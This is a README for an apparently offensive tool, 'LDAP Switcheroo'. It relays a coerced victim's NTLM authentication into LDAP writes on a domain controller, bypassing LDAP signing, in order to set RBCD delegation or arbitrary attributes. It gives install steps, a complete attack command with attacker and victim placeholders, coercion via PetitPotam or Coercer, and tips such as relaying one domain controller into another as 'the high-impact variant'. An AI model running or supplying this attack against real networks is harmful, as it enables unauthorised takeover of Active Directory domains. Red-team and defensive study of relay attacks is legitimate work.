# LDAP Switcheroo

Relay a coerced victim's NTLM authentication into an LDAP operation executed with the
victim's permissions, bypassing LDAP signing. Thin wrapper around Impacket's
`ntlmrelayx` (it starts `ntlmrelayx` for you).

## Install

Requires Python ≥ 3.9. The dependency on Impacket tracks `fortra/impacket` master
because the PyPI `0.13.1` release lacks the LDAP signing / SASL context APIs this tool
drives (PRs [#1919](https://github.com/fortra/impacket/pull/1919),
[#1959](https://github.com/fortra/impacket/pull/1959)) — the master tree is fetched
automatically, no `PYTHONPATH` or local Impacket checkout needed.

```
uv tool install .
```

Run without installing, from the repo:

```
uv run switcheroo ...
```

To pick up newer master, `uv lock --upgrade && uv tool install --force --reinstall .`.

## Requirements

- Run as root (SMB listener on TCP/445).
- A coercion tool to drive the victim to your listener (Coercer / PetitPotam).
- The victim must be coerced to authenticate over **SMB** (the only supported source).

## Usage

```
sudo switcheroo \
    'DOMAIN/attacker[:password]@DC.fqdn' \
    -dc-ip <DC_IP> \
    -base-dn 'DC=example,DC=com' \
    -listen-ip <ATTACKER_IP> \
    -victim 'DOMAIN/VICTIM$' \
    -modify-dn 'CN=VICTIM,CN=Computers,DC=example,DC=com' \
    -rbcd-sid '<ATTACKER_COMPUTER_SID>'
```

Then coerce the victim toward `-listen-ip` from another terminal.

Credentials follow Impacket's `[domain/]username[:password]@host`. Omit the password to
be prompted, or use `-hashes LMHASH:NTHASH` / `-no-pass`.

Keep stdin open (`ntlmrelayx` exits on EOF):

```
tail -f /dev/null | sudo switcheroo ... &
```

## Operational notes

- **Passwords with `!` or other shell specials**: launch via a script file, not an inline
  `bash -c` — escaping there mangles the password. The bootstrap bind runs at startup, so
  this fails immediately with the DC's error instead of at the first victim.
- **Victim topology**: the victim must not be the relay target's own machine account — DCs
  refuse same-machine reflection (`invalidCredentials, data 52e`). Coerce a different host;
  relaying one DC into another is the high-impact variant.
- **Clock skew** (Kerberos): `faketime -f '+8h' switcheroo ...` together with `-use-kerberos/-k`.

## Key options

| Option | Meaning |
|---|---|
| `target` | `[domain/]username[:password]@<DC host/IP>` — attacker account + target DC |
| `-dc-ip` / `-base-dn` / `-listen-ip` | DC IP, search base, attacker listener IP |
| `-victim DOMAIN/account` | only relay this victim |
| `-modify-dn` | DN of the object to modify as the victim |
| `-rbcd-sid SID` | write an RBCD descriptor granting this SID |
| `-value` / `-value-hex` / `-attribute` | write an arbitrary attribute instead of RBCD |
| `-ntlmrelayx PATH` | optional: run a specific `ntlmrelayx.py` instead of the installed one |
| `-use-kerberos` / `-k` | Kerberos for the attacker's signed LDAP connections (TGT from password/hashes) instead of NTLM; the relayed victim auth is unaffected |
| `-hashes`, `-no-pass`, `-debug`, `-ts` | auth / logging |

The tool prints the DC's `Bind`/`Modify` result codes and does an independent signed
read-back to confirm the write (the SMB/coercion side may still print `FAILED`).
